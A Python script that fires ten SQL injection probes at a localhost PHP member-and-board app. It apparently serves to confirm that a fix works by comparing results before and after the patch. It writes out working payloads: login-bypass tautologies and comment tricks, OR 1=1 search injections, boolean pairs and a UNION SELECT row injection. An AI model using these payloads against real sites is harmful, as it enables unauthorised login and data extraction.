"""Ten non-destructive SQLi probes against this localhost lab only."""
import argparse
import http.cookiejar
import json
import re
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime, timezone, timedelta
from pathlib import Path

BASE = 'http://localhost:8080'

def client():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

def request(opener, path, data=None):
    data = urllib.parse.urlencode(data).encode() if data is not None else None
    try:
        response = opener.open(BASE + path, data, timeout=15)
    except urllib.error.HTTPError as error:
        response = error
    return response.status, response.read().decode('utf-8', errors='replace')

def run():
    parser = argparse.ArgumentParser()
    parser.add_argument('--phase', choices=['before', 'after'], required=True)
    args = parser.parse_args()
    results = []
    login_payloads = [
        ('L1', 'ID tautology', "admin' or '1'='1", 'wrong'),
        ('L2', 'ID line comment', "admin' -- ", 'wrong'),
        ('L3', 'Password tautology', 'missing', "' OR '1'='1"),
        ('L4', 'ID block comment', "admin'/**/OR/**/1=1#", 'wrong'),
    ]
    for code, name, uid, pw in login_payloads:
        opener = client()
        status, body = request(opener, '/member/member_login_check.php', {'user_id': uid, 'user_pw': pw})
        _, session = request(opener, '/member/member_info.php')
        exploited = '로그인 되었습니다.' in body and 'name="user_pw1"' in session
        results.append(dict(id=code, name=name, endpoint='/member/member_login_check.php', payload={'user_id': uid, 'user_pw': pw}, status=status, exploited=exploited, evidence='authenticated profile accessible' if exploited else 'no authenticated profile'))
        request(opener, '/member/member_logout.php')
    for selection, name in [('1','Subject'), ('2','Content'), ('3','Author')]:
        opener = client()
        payload = "__sqli_no_match__%' OR 1=1 -- "
        status, body = request(opener, '/board/board_list.php?' + urllib.parse.urlencode({'k_s':selection,'keyword':payload}))
        rows = re.findall(r'href="board_view.php\?num=(\d+)', body)
        results.append(dict(id='S'+selection,name=name+' search',endpoint='/board/board_list.php',payload={'k_s':selection,'keyword':payload},status=status,exploited=bool(rows),evidence={'returned_board_ids':rows}))
    opener = client()
    true_payload, false_payload = '1 AND 1=1', '1 AND 1=2'
    ts, tb = request(opener, '/board/board_view.php?' + urllib.parse.urlencode({'num':true_payload}))
    fs, fb = request(opener, '/board/board_view.php?' + urllib.parse.urlencode({'num':false_payload}))
    def existing_row(body):
        return 'board_delete_ok.php?num=1' in body and '>test</font>' in body
    results.append(dict(id='V1',name='Boolean pair',endpoint='/board/board_view.php',payload=[true_payload,false_payload],status=[ts,fs],exploited=existing_row(tb) and not existing_row(fb),evidence={'true_has_row':existing_row(tb),'false_has_row':existing_row(fb)}))
    payload = '0 OR 1=1'
    status, body = request(opener, '/board/board_view.php?' + urllib.parse.urlencode({'num':payload}))
    results.append(dict(id='V2',name='Numeric OR',endpoint='/board/board_view.php',payload=payload,status=status,exploited='>test</font>' in body,evidence={'existing_subject_returned':'>test</font>' in body}))
    payload = "0 UNION SELECT 999,'probe','x','x','SQLI_UNION_MARKER','probe','F',0,NULL,NULL,NOW()"
    status, body = request(opener, '/board/board_view.php?' + urllib.parse.urlencode({'num':payload}))
    results.append(dict(id='V3',name='UNION synthetic row',endpoint='/board/board_view.php',payload=payload,status=status,exploited='>SQLI_UNION_MARKER</font>' in body,evidence={'synthetic_subject_returned':'>SQLI_UNION_MARKER</font>' in body}))
    document = dict(phase=args.phase, target=BASE, at=datetime.now(timezone(timedelta(hours=9))).isoformat(),results=results)
    Path('reports').mkdir(exist_ok=True)
    Path('reports/sqli-'+args.phase+'.json').write_text(json.dumps(document,ensure_ascii=False,indent=2),encoding='utf-8')
    for result in results:
        print(result['id'], 'EXPLOITED' if result['exploited'] else 'BLOCKED', result['name'])
    expected = args.phase == 'before'
    assert len(results) == 10 and all(r['exploited'] == expected for r in results), 'Unexpected probe outcome; inspect JSON evidence'

if __name__ == '__main__':
    run()
